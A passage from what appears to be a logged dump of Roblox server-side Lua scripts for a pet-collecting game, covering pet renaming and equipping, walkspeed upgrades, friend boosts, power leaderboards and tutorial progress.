        end
    end
    
    return false
end

local function isSigning(plyr, isSigned, name)
    if plyr then
        if isSigned then
            if name ~= plyr.Name then
                return false
            else 
                return hasPerms(plyr)
            end
        else
            if name ~= plyr.Name then
                return false
            else 
                return hasPerms(plyr)
            end
        end
    end
    
    return false
end

_L.Network.Invoked("Rename Pet").OnInvoke = function(plyr, uid, nk)
	uid =  tostring(uid)
	nk  =  tostring(nk)
	
	local save = _L.Saving.Get(plyr)
	if (not save) then
		return
	end
	
	local pet, owner = _L.Pets.Get(uid)
	
	if #nk >= 20 then
		return nil, "Name is too long. Try something shorter!"
	end
	
	local filtered
	local success,e = pcall(function()
		filtered = _L.TextService:FilterStringAsync(nk, plyr.UserId)
		filtered = filtered:GetNonChatStringForBroadcastAsync()
	end)

	if not success or not filtered then
		return nil, "Unable to filter your pet nickname. Try something else"
	end

	nk = tostring(filtered):sub(1,20)
	pet.nk = nk
	pet.snk = isSigning(plyr, pet.snk, nk)
	coroutine.wrap(function()
		_L.Network.FireAll("Pet Update", plyr, pet)
	end)()
	
	return true
end

_L.Network.Invoked("Unequip All Pets").OnInvoke = function(plyr)
	local save = _L.Saving.Get(plyr)
	if (not save) then
		return
	end
	
	local PetsEquipped = _L.Shared.IsHardcore and save.HardcorePetsEquipped or save.PetsEquipped
	
	for i, v in pairs(PetsEquipped) do
		if v.uid then
			_L.Pets.Unequip(tostring(v.uid))
		else
			_L.Pets.Unequip(tostring(v))
		end
	end
	
	return true
end

_L.Network.Invoked("Delete Several Pets").OnInvoke = function(plyr, pets)
	local save = _L.Saving.Get(plyr)
	if (not save) then
		return
	end
	
	for i, uid in ipairs(pets) do	
		pcall(function()
			_L.Pets.Delete(tostring(uid))
		end)
	end
	
	return true
end

_L.Signal.Invoked("Delete Several Pets").OnInvoke = function(plyr, pets)
    local save = _L.Saving.Get(plyr)
    if not save then
        return
    end

    for _, uid in ipairs(pets) do	
        _L.Pets.Delete(uid)
    end

    return true
end

--_L.Network.Invoked("Equip Best Pets").OnInvoke = function(plyr)
--	local save = _L.Saving.Get(plyr)
--	if (not save) then
--		return nil,"error"
--	end
--	
--	local pets = _L.Functions.CloneTable(save.Pets)
--	
--	table.sort(pets, function(new,old)
--		return old.s < new.s
--	end)
--	
--	local equipped = {}
--	
--	local canEquip = save.InfPetsEnabled and #save.Pets or #pets < _L.Shared.GetMaxEquippedSlots(save) + 1 and #save.Pets or _L.Shared.GetMaxEquippedSlots(save)
--	
--	for i = 1, canEquip do
--		local pet = pets[i]
--		if not pet then
--			break
--		end
--		
--		equipped[pet.uid] = pet
--	end	
--	
--	local PetsEquipped = _L.Pets.GetEquipped(plyr)
--	
--	for i, pet in ipairs(save.Pets) do
--		if pet.uid then
--			local dir = _L.Directory.Pets[tostring(pet.id)]
--			
--			if equipped[pet.uid] and (not dir.isGift) then
--				_L.Pets.Equip(pet.uid)
--			else
--				if _L.Pets.IsEquipped(plyr,pet.uid) then
--					_L.Pets.Unequip(pet.uid)
--				end
--			end
--		end
--	end
--	
--	return true
--end

function IsGameWorld(plr)
	local world = _L.Saving.Get(plr)
	if not world then
		return false
	end
	local world = _L.Shared.IsHardcore and world.Hardcore.World or world.World  
	if world ~= "Yeet" then
		return false
	end
	return true
end

_L.Network.Invoked("Equip Best Pets").OnInvoke = function(plr)
	local save = _L.Saving.Get(plr)
	if not save then
		return nil
	end
	
	local pets = table.clone(save.Pets)
	for i, v in ipairs(pets) do		
		local dir = _L.Directory.Pets[v.id]
		if dir then
			if dir.isGift then
				table.remove(pets, i)
			end
		end
	end 
	
	local maxSlots = _L.Shared.GetMaxEquippedSlots(save)
	if not maxSlots then
		return nil
	end
	
	local yeetPower
	if IsGameWorld(plr) then
		yeetPower = function(pet)
			return _L.Shared.GetYeetPower(pet, pets)
		end
	end 
	
	table.sort(pets, function(i, v)   
		local order = _L.Shared.PetOrderBest(i, v, nil, nil, nil, nil, yeetPower) or -1
		return (order < 0)==true --invalid order function for sorting
	end)
	
	local equippedPets = {}
	if save.InfPetsEnabled or #pets < maxSlots + 1 then
		maxSlots = #pets
	end	  
	
	for i = 1, maxSlots do
		local pet = pets[i]
		if not pet then
			break
		end

		equippedPets[pet.uid] = pet
	end	
	
	for index, pet in pairs(save.Pets) do
		if pet.uid then
			local dir = _L.Directory.Pets[pet.id]
			if equippedPets[pet.uid] and not dir.isGift then
				_L.Pets.Equip(pet.uid)
			elseif _L.Pets.IsEquipped(plr, pet.uid) then
				_L.Pets.Unequip(pet.uid)
			end
		end
	end	
	
	return true
end

_L.Network.Fired("Set Riding Pet"):Connect(function(plyr, uid)
	local save = _L.Saving.Get(plyr)
	if not save then
		return
	end
	
	if save.Settings.MountingTitanics ~= 1 then
		return
	end
	
    if uid == nil then
        _L.Network.FireAll("Set Riding Pet", plyr, nil)
    end
    
    local pet, owner = _L.Pets.Get(uid)
    if owner ~= plyr then
        return
    end
    
    local dir = _L.Directory.Pets[pet.id]
    if not dir or not dir.titanic then
        return     
    end
    
    _L.Network.FireAll("Set Riding Pet", plyr, pet.uid)
end)


---

local RNG = Random.new()
_L.Signal.Fired("Player Added"):Connect(function(player)
	coroutine.wrap(function()
		while wait(10) do
			
			if not player or not player.Parent then
				break
			end
			
			local save = _L.Saving.Get(player)

			if save then
				local pets = {}
				for i,v in pairs(save.Pets) do
					local dir = _L.Directory.Pets[tostring(v.id)]
					if dir and not dir.huge and not dir.titanic then
						table.insert(pets, _L.Functions.CloneTable(v))
					end
				end
				
				table.sort(pets, function(i, v)
					return v.s < i.s
				end)
				
				local bestStat = pets[1] and pets[1].s and pets[1].s or 1
				
				task.spawn(function()
					for i, v in pairs(save.Pets) do
						if v and (v.uid and v.s) then	
							---
							--local E = v.r and "Rainbow" or v.g and "Gold" or "Default"
							local Type = "Default"
							if v.r then
								Type = "Rainbow"
							elseif v.g then
								Type = "Golden"
							end
							--
							if _L.Shared.HasPower(v, "Titanic") then
								v.s = math.floor(bestStat * _L.Shared.TitanicMult[Type])
							elseif _L.Shared.HasPower(v, "Best Friend") then
								v.s = math.floor(bestStat * _L.Shared.BestFriendMult[Type])
							elseif _L.Shared.HasPower(v, "Companion", 1) then
								v.s = math.floor(bestStat * 0.5)  						
							elseif _L.Shared.HasPower(v, "Companion", 2) then
								v.s = math.floor(bestStat * 0.6)  						
							elseif _L.Shared.HasPower(v, "Companion", 3) then
								v.s = math.floor(bestStat * 0.75)  						
							end
						end
					end
				end)
            end
            
			task.spawn(function()
				if not save or not save.Pets then
					return
				end
				
                for i, v in pairs(save.Pets) do
                    if v.uid then
                        local _, owner = _L.Pets.Get(v.uid)
                        if _L.Pets.IsEquipped(owner, v.uid) and _L.Shared.HasPower(v, "Glittering") and owner == player then
                            local allEquippedPets = {}
                            for i, v in pairs(save.Pets) do
                                if v.uid and _L.Pets.IsEquipped(owner, v.uid) then
                                    table.insert(allEquippedPets, v.uid)
                                end
                            end
                            
                            local petPosition = _L.Network.Invoke("Get Pet Positions", player, allEquippedPets)
                            if type(petPosition) == "table" and petPosition[v.uid] and typeof(petPosition[v.uid]) == "Vector3" then
                                _L.Orbs.Add(player, petPosition[v.uid] or player.Character.HumanoidRootPart, "Diamonds", RNG:NextInteger(10, 30), 25)
                            end
                        end
                    end
                end
			end)
		end
	end)()
end)

---

local petDB = _L.DataStoreService:GetOrderedDataStore("PetDataBase" .. _L.Settings.StatsVersion)
local petData = {}
local petDataM = {}

local function organize()
    local o = {}
    
    for i, v in pairs(petData) do
        o[tostring(v.key)] = tonumber(v.value)
    end
    
    petDataM = o
end

local function refresh()
    local data = nil
    local success, err = pcall(function()
        data = petDB:GetSortedAsync(false, 100):GetCurrentPage()
    end)
    
    if success and data ~= nil then
        petData = data
        organize()
    end
end

coroutine.wrap(function()
    task.spawn(function()
        while not petData do
            refresh()
            wait(2)
        end
    end)
    
    task.spawn(function()
        local tracking = {}
        local dev = {}
        local saving = {}
        
        _L.Signal.Fired("Track Pet"):Connect(function(plyr, pet, uid)
            local save = _L.Saving.Get(plyr)
            if save then
                if not tracking[plyr.UserId] then
                    tracking[plyr.UserId] = {}
                end
                
                if _L.Functions.SearchArray(dev, uid) then
                    return
                end
                
                table.insert(dev, uid)
                table.insert(tracking[plyr.UserId], tostring(pet))
            end
        end)
        
        local function set(plyr)
            if tracking[plyr.UserId] and not saving[plyr.UserId] then
                saving[plyr.UserId] = true
                
                local cache = {}
                for i, v in pairs(tracking[plyr.UserId]) do
                    if cache[v] then
                        cache[v] = cache[v] + 1
                    else
                        cache[v] = 1
                    end
                end
                
                for i, v in pairs(cache) do
                    local success, err = pcall(function()
                        petDB:IncrementAsync(i, v)
                    end)
                    
                    if not success then
                        _L.Heartbeat(3) 
                        
                        local success, err = pcall(function()
                            petDB:IncrementAsync(i, v)
                        end)
                    end
                end
            end
        end
        
        game.Players.PlayerRemoving:Connect(function(...)
            set(...)
        end)
        
        game:BindToClose(function()
            for i, v in pairs(game.Players:GetPlayers()) do
                coroutine.wrap(function()
                    set(v)
                end)()
            end
        end)
        
        while wait(120) do -- 2 mins
            for i, v in pairs(game.Players:GetPlayers()) do
                coroutine.wrap(function()
                    set(v)
                end)()
            end
            refresh()
        end
    end)
end)()

_L.Network.Invoked("Get Pet Rarity DB").OnInvoke = function()
    return petDataM
end

_L.Signal.Fired("Pet Added"):Connect(function(plyr, uid)	
    local pet, owner = _L.Pets.Get(plyr)
    if not pet or owner ~= plyr then
        return
    end
    
    _L.Modules.Pets.AddOwner(plyr.UserId, nil, uid)
end)
  -  Editar
  04:54:13.770    -  Editar
  04:54:13.770  ----- [2340] ServerScriptService.Scripts.Game.Player -----  -  Editar
  04:54:13.770  --[[
                                                           ,,,,,,╓╓╓╓╓╖
         ,,,,╓╓╓╓╖╥╥╗╗╗╗╗╗╗HH@@@@@@@Ñ╣╣╣╣╢╢╢╣▒▒▒▒▒▒▒▒Ñ╝╜╙╙╙╨╝╢▒▒▒▒▒▒▒▒▒[
         ▒▒▒▒╜╙╙╙╙""""````"╙╨╣▒▒▒▒▒▒[     ║▒▒▒▒▒▒╢╜            ╙╣▒▒▒▒▒▒[
         ▒▒▒▒[                 ║▒▒▒▒[     ║▒▒▒▒▒╜                ╙▒▒▒▒▒╡
         ▒▒▒▒[     ,,,,╓╓       ║▒▒▒╣     ║▒▒▒▒╜     ╓╣▒▒▒▒@,     ╠▒▒▒▒╢
         ▒▒▒▒╢     ]▒▒▒▒▒▒@     ]▒▒▒╢     ]▒▒▒╣     ]▒▒▒▒▒▒▒▒H@╣╢▒▒▒▒▒▒▒
         ╢▒▒▒▒     ]▒▒▒▒▒Ñ`     ╢▒▒▒▒     ]▒▒▒L     ╢▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
         ║▒▒▒▒                ╓╣▒▒▒▒▒     ]▒▒▒      ▒▒▒▒▒╜╙╙╙╙╙╙"""║▒▒▒▒
         ║▒▒▒▒                 ╙╣▒▒▒▒      ▒▒▒U     ╢▒▒▒▒          ║▒▒▒▒
         ]▒▒▒▒      HH@@@%╗      ╢▒▒▒      ▒▒▒[     ]▒▒▒▒          ]▒▒▒▒
         ]▒▒▒▒      ▒▒▒▒▒▒▒╣     ]▒▒▒      ▒▒▒▒      ║▒▒▒▒▒▒▒╜     ]▒▒▒▒
         ]▒▒▒▒      ▒▒▒▒▒▒▒╜     ]▒▒▒U     ▒▒▒▒╣      `╨ÑÑ╝╜       ]▒▒▒▒U
          ▒▒▒▒U     ``           ╣▒▒▒L     ╢▒▒▒▒╣╖                  ▒▒▒▒[
          ▒▒▒▒[                ╔╣▒▒▒▒[     ║▒▒▒▒▒▒╣╗,        ╓@L ,,,▒▒▒▒[
          ▒▒▒▒[,,,╓╓╓╓╓╓╓╗╗@@╢▒▒▒▒▒▒▒╣@@@@Ñ╣▒▒▒▒▒▒▒▒▒▒▒╢╢║╢ÑÑÑÑ╝╝╝╝╝╝╨╨╜┘
          ╝╝╝╝╝╝╨╨╜╜╙╙╙╙╙╙""""````                    ,,,,,    ,╓╖,
               ,╥@@@╗,    ╥@╣╢╣N,   ╢╣▒▒▒▒╣╗  ║▒▒  ║▒▒▒▒╢╢╢  ╔╣╣╜╙╢▒╣
              ╔▒▒╜╙╙╣▒@  ╢▒╝` ╙▒▒╗  ▒▒[   ▒▒[ ║▒▒  ║▒▒       ╢▒@╖
              ▒▒[       ║▒▒    ]▒▒  ╢▒╢  ╓▒▒[ ]▒▒  ]▒▒╣╣╣╢    "╨╣▒▒╣╗
              ▒▒U       ║▒▒    ]▒▒  ║▒▒▒▒╢Ñ╜  ]▒▒  ]▒▒        ,    ╙▒╢
              ╢▒╣   ╓@╗  ▒▒╗   ╣▒╣  ║▒▒       ]▒▒  ]▒▒╗╗╗m╗m ╙▒╢H╥╗╣▒╝
               ╝▒▒╣╣▒╢╜   ╝▒▒▒▒╢╜   ║▒▒        Ñ╝   ╝╝╝╨╨╜╜╜   `╙╙╙
              
           By: @localonex     
--]]


--------|     Setting     |--------

--------|     Library     |--------
local _L = require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library"))
while (not _L.Loaded) do  game:GetService("RunService").Heartbeat:Wait()  end

--------|    Reference    |--------

--------|    Variables    |--------

--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------

local function setHumanoidWalkSpeed(chr, plyr, speed)
    if not chr or not plyr.Parent then
        return
    end
    
    local save = _L.Saving.Get(plyr)
    if not save then
        return
    end
    
    local humanoid = chr:WaitForChild("Humanoid", 10)
    if humanoid then
        humanoid.WalkSpeed = 16 + ((speed or save.Upgrade["Player Walkspeed"] or 0 ) * 2)
    end
end

_L.Signal.Fired("Player Added"):Connect(function(plr)
    local save = _L.Saving.Get(plr)
    
    while task.wait() do
        if plr and plr.Parent then
            local dir = _L.Directory.Fruits["Pear"]
            local m = _L.Fruit.Get(plr, dir) or 0
            local EE=_L.Fruit.GetBonus(plr, dir) --dir.Bonus(m)
            if tonumber(EE) and EE > 0 and EE < 1 then
                EE = EE + 1
            end
            if m >= 1 then
                setHumanoidWalkSpeed(plr.Character, plr, (save.Upgrades["Player Walkspeed"] or 1) + (EE or 0))
            end
        end
    end
end)

_L.Signal.Fired("Upgrade Bought"):Connect(function(plyr, u, speed)
    if u == "Player Walkspeed" then
        setHumanoidWalkSpeed(plyr.Character, plyr, speed)
    elseif u == "Pet Storage" then
        _L.Give.Slots(plyr, 5)
    elseif u == "Halloween Pet Storage" then
        _L.Give.Slots(plyr, 3)
    end
    
end)

_L.Signal.Fired("Player Added"):Connect(function(player)
	player.CharacterAdded:Connect(function(c)
		setHumanoidWalkSpeed(c, player, 0)
    end)
    
	if player.Character then
		setHumanoidWalkSpeed(player.Character, player, 0)
    end
    
	player:SetAttribute("UsingHoverboard", false)
    
    coroutine.wrap(function()
        while wait(1.5) do
			local save = _L.Saving.Get(player)
            if save then
                if save.HardcoreUnlocked then
                    break
                end
                
                local maxlev = 0
                local xp = 0
                
                for i, v in pairs(_L.Directory.Mastery) do
                    if v.enabled then
                        maxlev = maxlev + v.maxLvl
                        
                        local e = save.Mastery[i]
                        if e then
                            xp = xp + _L.Shared.MasteryLevelToXP(e)
                        end
                    end
                end
                
                if math.round(xp / maxlev * 100) >= 25 then
                    save.HardcoreUnlocked = true
                    break
                end
            end
        end
    end)()
	
	local LastCheck = 0
	coroutine.wrap(function()
		while true do
			if player and player.Parent then
				local save = _L.Saving.Get(player)
				if save then
					if LastCheck == 0 then save.FriendsBoost = 1 end
					if os.clock() - LastCheck >= 5 and _G.FriendCache and _G.FriendCache[tostring(player.UserId)] then
						task.spawn(function()
							local boost = 1
							local success, err = pcall(function()
								for i,v in pairs(_G.FriendCache[tostring(player.UserId)]) do
									if i % 15 == 0 then
										_L.Heartbeat()
									end
									if boost >= 3 then
										break
									end
									if game.Players:GetPlayerByUserId(v) then
										boost = boost + 0.2
									end
								end
							end)
							if not success then
								save.FriendsBoost = 1
							else
								boost = math.clamp(boost, 1, 3)
								save.FriendsBoost = boost
							end
							LastCheck = os.clock()
						end)
					end
				end
			else
				break
			end
			_L.Heartbeat(5)
		end
	end)()
end)

_L.Network.Fired("Sent Progress Notification"):Connect(function(plyr, d, n)
    local save = _L.Saving.Get(plyr)
    if save then
        local dir = _L.Directory[n][d]
        if dir then
            if save.ProgressNotifications[n] then
                if not _L.Functions.SearchArray(save.ProgressNotifications[n], tostring(d)) then
                    table.insert(save.ProgressNotifications[n], d)
                end
            end
        end
    end
end)

_L.Network.Fired("Read Changelog"):Connect(function(plyr)
    local save = _L.Saving.Get(plyr)
    if save then
        if save.LastUpdateLog ~= _L.Shared.UpdateLogId then
            save.LastUpdateLog = _L.Shared.UpdateLogId 
        end
    end
end)

local saveCache = {}
_L.Signal.Fired("Player Added"):Connect(function(player)
	local save = _L.Saving.Get(player)
	if save then
		save.LoginTime = workspace:GetServerTimeNow()
		saveCache[tostring(player.UserId)] = save
	end
end)	

game.Players.PlayerRemoving:Connect(function(player)
	local save = saveCache[tostring(player.UserId)]
	if save then
		save.Age = _L.Shared.ComputeSaveAge(save)
	end	
end)

_L.Network.Invoked("Get OSTime").OnInvoke = function(player)
	return os.time()
end

--- FRIENDS
_G.FriendCache = {}

local function iterPageItems(pages)
	return coroutine.wrap(function()
		local pagenum = 1
		while true do
			for _, item in ipairs(pages:GetCurrentPage()) do
				coroutine.yield(item, pagenum)
			end
			if pages.IsFinished then
				break
			end
			pages:AdvanceToNextPageAsync()
			pagenum = pagenum + 1
		end
	end)
end

function registerFriends(player)
	pcall(function()
		local friendPages = _L.Players:GetFriendsAsync(player.UserId)
		local usernames = {}
		
		for item, pageNo in iterPageItems(friendPages) do
			table.insert(usernames, item.Id)
		end
		
		_G.FriendCache[tostring(player.UserId)] = usernames
	end)
end

_L.Signal.Fired("Player Added"):Connect(function()	
	--_G.FriendsCache[tostring(player.UserId)] = usernames
	for _, plr in ipairs(_L.Players:GetPlayers()) do
		registerFriends(plr)
	end	
end)  -  Editar
  04:54:13.770    -  Editar
  04:54:13.770  ----- [2341] ServerScriptService.Scripts.Game.PowerLeaderboard -----  -  Editar
  04:54:13.770  --[[
                                                           ,,,,,,╓╓╓╓╓╖
         ,,,,╓╓╓╓╖╥╥╗╗╗╗╗╗╗HH@@@@@@@Ñ╣╣╣╣╢╢╢╣▒▒▒▒▒▒▒▒Ñ╝╜╙╙╙╨╝╢▒▒▒▒▒▒▒▒▒[
         ▒▒▒▒╜╙╙╙╙""""````"╙╨╣▒▒▒▒▒▒[     ║▒▒▒▒▒▒╢╜            ╙╣▒▒▒▒▒▒[
         ▒▒▒▒[                 ║▒▒▒▒[     ║▒▒▒▒▒╜                ╙▒▒▒▒▒╡
         ▒▒▒▒[     ,,,,╓╓       ║▒▒▒╣     ║▒▒▒▒╜     ╓╣▒▒▒▒@,     ╠▒▒▒▒╢
         ▒▒▒▒╢     ]▒▒▒▒▒▒@     ]▒▒▒╢     ]▒▒▒╣     ]▒▒▒▒▒▒▒▒H@╣╢▒▒▒▒▒▒▒
         ╢▒▒▒▒     ]▒▒▒▒▒Ñ`     ╢▒▒▒▒     ]▒▒▒L     ╢▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
         ║▒▒▒▒                ╓╣▒▒▒▒▒     ]▒▒▒      ▒▒▒▒▒╜╙╙╙╙╙╙"""║▒▒▒▒
         ║▒▒▒▒                 ╙╣▒▒▒▒      ▒▒▒U     ╢▒▒▒▒          ║▒▒▒▒
         ]▒▒▒▒      HH@@@%╗      ╢▒▒▒      ▒▒▒[     ]▒▒▒▒          ]▒▒▒▒
         ]▒▒▒▒      ▒▒▒▒▒▒▒╣     ]▒▒▒      ▒▒▒▒      ║▒▒▒▒▒▒▒╜     ]▒▒▒▒
         ]▒▒▒▒      ▒▒▒▒▒▒▒╜     ]▒▒▒U     ▒▒▒▒╣      `╨ÑÑ╝╜       ]▒▒▒▒U
          ▒▒▒▒U     ``           ╣▒▒▒L     ╢▒▒▒▒╣╖                  ▒▒▒▒[
          ▒▒▒▒[                ╔╣▒▒▒▒[     ║▒▒▒▒▒▒╣╗,        ╓@L ,,,▒▒▒▒[
          ▒▒▒▒[,,,╓╓╓╓╓╓╓╗╗@@╢▒▒▒▒▒▒▒╣@@@@Ñ╣▒▒▒▒▒▒▒▒▒▒▒╢╢║╢ÑÑÑÑ╝╝╝╝╝╝╨╨╜┘
          ╝╝╝╝╝╝╨╨╜╜╙╙╙╙╙╙""""````                    ,,,,,    ,╓╖,
               ,╥@@@╗,    ╥@╣╢╣N,   ╢╣▒▒▒▒╣╗  ║▒▒  ║▒▒▒▒╢╢╢  ╔╣╣╜╙╢▒╣
              ╔▒▒╜╙╙╣▒@  ╢▒╝` ╙▒▒╗  ▒▒[   ▒▒[ ║▒▒  ║▒▒       ╢▒@╖
              ▒▒[       ║▒▒    ]▒▒  ╢▒╢  ╓▒▒[ ]▒▒  ]▒▒╣╣╣╢    "╨╣▒▒╣╗
              ▒▒U       ║▒▒    ]▒▒  ║▒▒▒▒╢Ñ╜  ]▒▒  ]▒▒        ,    ╙▒╢
              ╢▒╣   ╓@╗  ▒▒╗   ╣▒╣  ║▒▒       ]▒▒  ]▒▒╗╗╗m╗m ╙▒╢H╥╗╣▒╝
               ╝▒▒╣╣▒╢╜   ╝▒▒▒▒╢╜   ║▒▒        Ñ╝   ╝╝╝╨╨╜╜╜   `╙╙╙
              
           By: @localonex     
--]]


--------|     Setting     |--------
local NonHardcoreDiv = 3 --0.1

--------|     Library     |--------
local _L = require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library"))
while (not _L.Loaded) do  game:GetService("RunService").Heartbeat:Wait()  end

--------|    Reference    |--------

--------|    Variables    |--------
local globalDB = _L.DataStoreService:GetOrderedDataStore("globalPower" .. _L.Settings.StatsVersion)
local localLeaderboardData = {}
local globalLeaderboardData = {}
local serverGlobalData = {}
local cache = {}

--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------

function GetPetPower(pet)
	local stat = pet.s 

	if not stat then
		return 0
	end

	if stat == 0 then
		return 0
	end

	if pet.hc then
		return stat/NonHardcoreDiv
	else
		local length = math.ceil(math.log10(stat)) 
		if length <= 1 then
			length = 1
		end
		local div = NonHardcoreDiv*length
		if div <= 1 then
			div = 1
		end
		return stat/div
	end
end

function CalculatePower(plyr)
	local save = _L.Saving.Get(plyr)
	if not save then
		return 0
	end

	local power = 0
	for i, v in pairs(save.Pets) do
		if _L.Directory.Pets[v.id] then
			power = power + GetPetPower(v) --( v.s or 0 )
		end
	end

	return power
end 

coroutine.wrap(function()
	while wait(2) do
		local a = {}

		for i, v in pairs(game.Players:GetPlayers()) do
			table.insert(a, {
				player = v,
				level = CalculatePower(v)
			})
		end

		localLeaderboardData = a
		table.sort(localLeaderboardData, function(i, v)
			return i.level > v.level
		end)

		a = nil
	end
end)()

_L.Network.Invoked("Get Local Power Leaderboard").OnInvoke = function(plyr)
	table.sort(localLeaderboardData, function(i, v)
		return i.level > v.level
	end)
	return localLeaderboardData
end

coroutine.wrap(function()
	local function convert()
		local recentData
		local err = "???"

		for i = 1, 3 do
			if recentData ~= nil then
				break
			end
			local dat
			local success, err = pcall(function()
				dat = globalDB:GetSortedAsync(false, 100):GetCurrentPage()
			end)
			if dat and success then
				recentData = dat
				break
			else
				wait(10)
			end
		end

		if not recentData and err then
			warn("global error : " .. err)
		end

		if recentData then
			local Converted = {}
			serverGlobalData = {}
			pcall(function()
				for Rank, Data in ipairs(recentData) do
					if tonumber(Data.key) >= 1 then
						local ID = Data.key
						local name

						pcall(function()
							if cache[tostring(ID)] then
								name = cache[tostring(ID)]
							else
								name = game.Players:GetNameFromUserIdAsync(ID)
								cache[tostring(ID)] = name
							end
						end)

						table.insert(Converted, {
							level = math.floor(Data.value), 
							username = name or "???"
						})

						table.insert(serverGlobalData, {
							rank = #serverGlobalData + 1,
							id = tonumber(ID),
						})
					end

					_L.Heartbeat()
				end
			end)
			globalLeaderboardData = Converted
			_L.Variables.LoadedLB = true
		end
	end

	convert()

	while wait(30) do
		convert()
	end
end)()

local function save(plyr)
	local power = CalculatePower(plyr)
	if power >= 1 then
		local success, err = pcall(function()
			globalDB:SetAsync(plyr.UserId, power)
		end)

		if not success then
			warn("Error: ", err)
		end
	end    
end

_L.Network.Invoked("Get Global Power Leaderboard").OnInvoke = function(plyr)
	return globalLeaderboardData
end

_L.Signal.Invoked("Get Power Leaderboard Position").OnInvoke = function(plyr)
	for i, v in pairs(serverGlobalData) do
		if v.id == plyr.UserId then
			return v.rank or nil
		end
	end

	return nil
end

_L.Signal.Fired("Player Added"):Connect(function(plyr)
	coroutine.wrap(function()
		while wait(80) do
			if not plyr or plyr.Parent then
				break
			end
			save(plyr)
		end
	end)()
end)

game.Players.PlayerRemoving:Connect(save)
game:BindToClose(function()
	for i, v in ipairs(game.Players:GetPlayers()) do
		save(v)
	end
end)  -  Editar
  04:54:13.770    -  Editar
  04:54:13.770  ----- [2342] ServerScriptService.Scripts.Game.Tutorial -----  -  Editar
  04:54:13.771  --[[
                                                           ,,,,,,╓╓╓╓╓╖
         ,,,,╓╓╓╓╖╥╥╗╗╗╗╗╗╗HH@@@@@@@Ñ╣╣╣╣╢╢╢╣▒▒▒▒▒▒▒▒Ñ╝╜╙╙╙╨╝╢▒▒▒▒▒▒▒▒▒[
         ▒▒▒▒╜╙╙╙╙""""````"╙╨╣▒▒▒▒▒▒[     ║▒▒▒▒▒▒╢╜            ╙╣▒▒▒▒▒▒[
         ▒▒▒▒[                 ║▒▒▒▒[     ║▒▒▒▒▒╜                ╙▒▒▒▒▒╡
         ▒▒▒▒[     ,,,,╓╓       ║▒▒▒╣     ║▒▒▒▒╜     ╓╣▒▒▒▒@,     ╠▒▒▒▒╢
         ▒▒▒▒╢     ]▒▒▒▒▒▒@     ]▒▒▒╢     ]▒▒▒╣     ]▒▒▒▒▒▒▒▒H@╣╢▒▒▒▒▒▒▒
         ╢▒▒▒▒     ]▒▒▒▒▒Ñ`     ╢▒▒▒▒     ]▒▒▒L     ╢▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
         ║▒▒▒▒                ╓╣▒▒▒▒▒     ]▒▒▒      ▒▒▒▒▒╜╙╙╙╙╙╙"""║▒▒▒▒
         ║▒▒▒▒                 ╙╣▒▒▒▒      ▒▒▒U     ╢▒▒▒▒          ║▒▒▒▒
         ]▒▒▒▒      HH@@@%╗      ╢▒▒▒      ▒▒▒[     ]▒▒▒▒          ]▒▒▒▒
         ]▒▒▒▒      ▒▒▒▒▒▒▒╣     ]▒▒▒      ▒▒▒▒      ║▒▒▒▒▒▒▒╜     ]▒▒▒▒
         ]▒▒▒▒      ▒▒▒▒▒▒▒╜     ]▒▒▒U     ▒▒▒▒╣      `╨ÑÑ╝╜       ]▒▒▒▒U
          ▒▒▒▒U     ``           ╣▒▒▒L     ╢▒▒▒▒╣╖                  ▒▒▒▒[
          ▒▒▒▒[                ╔╣▒▒▒▒[     ║▒▒▒▒▒▒╣╗,        ╓@L ,,,▒▒▒▒[
          ▒▒▒▒[,,,╓╓╓╓╓╓╓╗╗@@╢▒▒▒▒▒▒▒╣@@@@Ñ╣▒▒▒▒▒▒▒▒▒▒▒╢╢║╢ÑÑÑÑ╝╝╝╝╝╝╨╨╜┘
          ╝╝╝╝╝╝╨╨╜╜╙╙╙╙╙╙""""````                    ,,,,,    ,╓╖,
               ,╥@@@╗,    ╥@╣╢╣N,   ╢╣▒▒▒▒╣╗  ║▒▒  ║▒▒▒▒╢╢╢  ╔╣╣╜╙╢▒╣
              ╔▒▒╜╙╙╣▒@  ╢▒╝` ╙▒▒╗  ▒▒[   ▒▒[ ║▒▒  ║▒▒       ╢▒@╖
              ▒▒[       ║▒▒    ]▒▒  ╢▒╢  ╓▒▒[ ]▒▒  ]▒▒╣╣╣╢    "╨╣▒▒╣╗
              ▒▒U       ║▒▒    ]▒▒  ║▒▒▒▒╢Ñ╜  ]▒▒  ]▒▒        ,    ╙▒╢
              ╢▒╣   ╓@╗  ▒▒╗   ╣▒╣  ║▒▒       ]▒▒  ]▒▒╗╗╗m╗m ╙▒╢H╥╗╣▒╝
               ╝▒▒╣╣▒╢╜   ╝▒▒▒▒╢╜   ║▒▒        Ñ╝   ╝╝╝╨╨╜╜╜   `╙╙╙
              
           By: @localonex     
--]]


--------|     Setting     |--------
local CoinsNeeded = 300
local delay = 5 -- needs to wait x seconds to show progress.

--------|     Library     |--------
local _L = require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library"))
while (not _L.Loaded) do  game:GetService("RunService").Heartbeat:Wait()  end

--------|    Reference    |--------

--------|    Variables    |--------
local CoinsHas = 0
local LastCheck = os.clock()

--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------

_L.Signal.Fired("Player Added"):Connect(function(player)
	local save = _L.Saving.Get(player)
	if not save then
		return
	end
	
	if save.Coins and (not save.TutorialFinished) then
		CoinsHas = save.Coins
	end
end)

_L.Signal.Fired("Stat Changed"):Connect(function(player, stat)
	if stat == "Coins" then
		local save = _L.Saving.Get(player)
		if save then
			local configured = math.round(save.Coins / 3)
			if configured >= 100 and not save.TutorialFinished then
				save.TutorialFinished = true
				_L.Network.Fire("Finished Tutorial", player)
				return
			end
			
			if (os.clock() - LastCheck) >= delay then
				save.TutorialProgress = configured
			end
			
			LastCheck = os.clock()
		end
	end
end)  -  Editar
  04:54:13.771    -  Editar
  04:54:13.771  ----- [2343] ServerScriptService.Scripts.Game.WelcomeMessage -----  -  Editar
  04:54:13.771  --[[
                                                           ,,,,,,╓╓╓╓╓╖
